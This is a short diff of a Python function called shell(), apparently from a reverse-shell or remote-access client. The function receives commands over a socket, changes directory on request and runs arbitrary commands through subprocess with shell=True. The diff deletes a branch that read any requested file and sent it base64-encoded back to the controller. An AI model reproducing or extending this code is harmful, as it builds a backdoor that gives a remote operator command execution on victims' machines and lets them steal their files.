@@ -16,9 +16,6 @@ def shell():
             os.chdir(res[3:])
             result = os.getcwd()
             cliente.send(result)
-        elif res[:8] == "download":
-            with open(res[9:], 'rb') as file_download:
-                cliente.send(base64.b64encode(file_download.read()))
 
         else:
             proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
